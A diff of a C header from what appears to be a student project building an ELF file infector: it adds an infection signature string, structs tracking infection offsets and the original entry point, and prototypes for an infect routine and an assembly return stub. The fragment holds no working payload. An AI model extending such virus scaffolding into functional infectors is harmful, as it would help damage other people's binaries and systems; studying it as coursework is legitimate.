@@ -6,7 +6,7 @@
 /*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/09/09 03:01:42 by nguiard           #+#    #+#             */
-/*   Updated: 2024/10/31 15:25:21 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/05 12:23:53 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,9 +19,11 @@
 #include <fcntl.h>
 #include <stdbool.h>
 #include <elf.h>
+#include <stddef.h>
 
-typedef	char *			str;
-typedef	unsigned char	byte;
+typedef	char *				str;
+typedef	unsigned char		byte;
+typedef	unsigned __int128	uint128_t;
 
 #define SIGNATURE		"Infected by adben-mc and nguiard ;)"
 #define SIGNATURE_LEN	36
@@ -33,6 +35,13 @@ typedef struct dirent {
 	char			d_name[256];
 }	dirent;
 
+typedef struct profiling {
+	byte	*start_rip;
+	size_t	size;
+	byte	*signature;
+	bool	original;
+}	profiling;
+
 typedef struct elf_data {
 	Elf64_Ehdr	*elf;
 	Elf64_Shdr	*sections;
@@ -40,6 +49,7 @@ typedef struct elf_data {
 	byte		*file;
 	size_t		signature_offset;
 	size_t		infection_offset;
+	size_t		original_entry_point;
 }	elf_data;
 
 #define DT_UNKNOWN  0   // Unknown file type
@@ -63,13 +73,21 @@ typedef struct elf_data {
 
 #include "asm_macros.h"
 
+#define SIGNATURE_OFFSET	32
+
 //	Utils
-size_t	ft_strlen(str buff);
-bool	ft_memcmp(const byte *a, const byte *b, size_t size);
-void	ft_memcpy(byte *dest, const byte *src, size_t size);
+size_t		ft_strlen(str buff);
+bool		ft_memcmp(const byte *a, const byte *b, size_t size);
+void		ft_memcpy(byte *dest, const byte *src, size_t size);
 
 //	Infection
-bool	infect(const str path);
+bool		infect(profiling *this, const str path);
+
+//	Profiling
+profiling	get_profiling(byte *start_rip);
+
+//	return.s
+void		the_point_of_no_return(bool original);
 
 // Debug purpose
 #ifdef DEBUG
@@ -84,7 +102,7 @@ bool	infect(const str path);
 
 #else
 
-# define printf(x)
+# define printf(...)
 # define perror(x)
 # define fflush(x)
 
